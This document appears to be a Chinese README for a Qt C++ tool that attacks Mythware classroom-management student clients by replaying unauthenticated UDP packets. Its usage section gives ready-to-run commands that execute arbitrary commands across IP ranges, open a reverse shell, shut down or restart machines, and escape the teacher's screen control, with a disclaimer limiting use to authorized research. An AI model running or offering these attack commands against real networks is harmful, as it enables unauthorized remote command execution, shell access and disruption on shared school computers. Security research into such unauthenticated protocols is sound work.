# Jiyu UDP Attack - Qt C++ 版本

极域电子教室数据包 (udp) 重放攻击工具的 Qt C++ 实现

## 项目说明

+ 因为极域的学生端没有对接收到的 udp 包做身份验证，导致了我们可以构造特定的数据包让学生端来执行，从而实现命令执行攻击机房内上线的任意学生端机器。

## 编译环境

- **Qt**: 5.15 或更高版本 (Qt6 也支持)
- **编译器**: MSVC 2019/2022 或 MinGW
- **CMake**: 3.16 或更高版本
- **构建工具**: nmake 或 mingw32-make

## 构建方法

### 使用 CMake

```bash
mkdir build
cd build
cmake .. -DCMAKE_BUILD_TYPE=Release
cmake --build . --config Release
```

### 使用 qmake

```bash
qmake JiyuUdpAttack.pro
make
```

### Windows 一键打包

运行 `deploy.bat` 脚本会自动完成编译和打包。

## 使用方法

```
使用方法:
  -ip <IP>          指定目标 IP 地址 (支持 192.168.1.10-56 或 192.168.1.1/24)
  -p <port>         指定监听端口，默认端口为 4705
  -msg <message>    发送消息 eg: -msg "Hello World!"
  -c <command>      执行命令 eg: -c "cmd.exe /c ipconfig"
  -l <count>        循环次数，默认为 1
  -t <interval>     循环时间间隔，默认是 22 秒
  -e <option>       额外选项：r(重启), s(关机), g(获取信息), nc(反弹 shell), break(脱离控制), continue(恢复控制)
  -ncport <port>    反弹 shell 的端口 (可选，默认随机)
  -h, --help        显示帮助信息
```

## 使用例子

### Tips:
使用 **-ip** 参数指定目标 IP 时，可以有以下几种指定方式:
- 指定单个 IP，如 `192.168.80.12`
- 指定 IP 范围，如 `192.168.80.10-56`
- 指定 IP 所在 C 段，如 `192.168.80.1/24`

### 1. 获取内网 ip 地址及监听的端口
若学生端监听端口不是默认的**4705**，则在后续操作过程中需使用 **-p** 参数指定端口
```bash
JiyuUdpAttack.exe -e g
```

### 2. 脱离屏幕控制
当前运行权限需为管理员权限，主要用于开启 MpsSvc 服务
```bash
JiyuUdpAttack.exe -e break
```

### 3. 恢复屏幕控制
```bash
JiyuUdpAttack.exe -e continue
```

### 4. 发送消息
若学生端监听端口为**4705**，向 IP 地址为 192.168.80.12 的机器发送一条内容为"hello,baby!"的消息
```bash
JiyuUdpAttack.exe -ip 192.168.80.12 -msg "hello,baby!"
```

若学生端监听端口为**4605**，需使用 **-p** 参数指定端口
```bash
JiyuUdpAttack.exe -ip 192.168.80.12 -p 4605 -msg "hello,baby!"
```

### 5. 执行命令
给 192.168.80.12 到 192.168.80.137 弹一个计算器
```bash
JiyuUdpAttack.exe -ip 192.168.80.12-137 -c calc.exe
```

### 6. 反弹 shell
反弹 shell 时，IP 只能为某个机器 IP，不能批量反弹，而且机器需要出网
```bash
JiyuUdpAttack.exe -ip 192.168.80.12 -e nc
```

### 7. 关机重启
关机
```bash
JiyuUdpAttack.exe -ip 192.168.80.12 -e s
```
重启
```bash
JiyuUdpAttack.exe -ip 192.168.80.12 -e r
```

### 8. 循环
利用循环持续发送消息
1-254 的机器会收到一条"hello,baby!"的消息，50s 后会继续执行，共执行 3 次
```bash
JiyuUdpAttack.exe -ip 192.168.80.23/24 -msg "hello,baby!" -l 3 -t 50
```

## 项目结构

```
JiyuUdpAttack/
├── CMakeLists.txt                 # CMake 构建配置
├── JiyuUdpAttack.pro              # qmake 项目文件
├── README.md                      # 使用说明
├── deploy.bat                     # Windows 打包脚本
├── src/
│   ├── jiyuudpattack.h            # 核心类头文件
│   ├── jiyuudpattack.cpp          # 核心类实现
│   └── main.cpp                   # 命令行入口
└── bin/                           # 编译输出目录
```

## 版本说明

### v1.0 (Qt 版本)
- 基于 Python 版本重写
- 使用 Qt Network 模块处理 UDP 通信
- 支持跨平台编译 (Windows/Linux)
- 优化代码结构和可维护性

## 注意事项

1. **法律风险**: 本工具仅用于教育和安全研究目的，请勿用于非法用途
2. **权限要求**: 部分功能 (如 break 选项) 需要管理员权限
3. **使用范围**: 确保在授权范围内使用，未经授权的攻击行为可能违法

## 参考资料

- 原始 Python 版本：https://github.com/ht0Ruial/Jiyu_udp_attack
- Qt 文档：https://doc.qt.io/
- CMake 文档：https://cmake.org/documentation/

## License

本项目仅供学习研究使用
